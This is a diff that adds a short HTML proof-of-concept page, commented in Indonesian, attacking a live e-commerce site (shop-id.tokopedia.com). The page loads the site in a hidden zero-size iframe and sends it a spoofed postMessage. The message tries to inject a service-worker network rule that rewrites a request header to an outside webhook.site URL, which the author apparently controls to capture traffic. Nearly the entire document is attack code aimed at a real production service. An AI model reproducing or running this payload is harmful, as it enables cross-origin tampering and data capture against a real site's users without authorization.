@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cross-Origin SW Injection PoC</title>
+</head>
+<body>
+    <h1>TikTok/Tokopedia PoC</h1>
+    <p>Script ini akan mencoba menginjeksi rule ke Service Worker via Iframe.</p>
+
+    <iframe id="targetFrame" src="https://shop-id.tokopedia.com" style="width:0;height:0;border:0; border:none;"></iframe>
+
+    <script>
+        window.onload = function() {
+            const frame = document.getElementById('targetFrame');
+            
+            // Payload sesuai pns_logic.js: eventName "network_rule"
+            const payload = {
+                source: "main_thread", // Spoofing source
+                eventName: "network_rule", // Triggers re.setClientRules
+                data: [{
+                    ruleName: "exploit_webhook",
+                    global: true,
+                    conditions: [],
+                    handlers: [{
+                        handler: "replace",
+                        type: "header",
+                        field: "X-Pns-Referrer",
+                        value: "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e" // Cek Webhook lu nanti di header ini
+                    }]
+                }]
+            };
+
+            // Mencoba kirim postMessage ke konten di dalam iframe
+            // Ini akan berhasil jika shop-id.tokopedia.com punya kerentanan di listener window-nya juga
+            frame.contentWindow.postMessage(payload, "*");
+            
+            console.log("Attempted to inject rule via postMessage to iframe.");
+        };
+    </script>
+</body>
+</html>
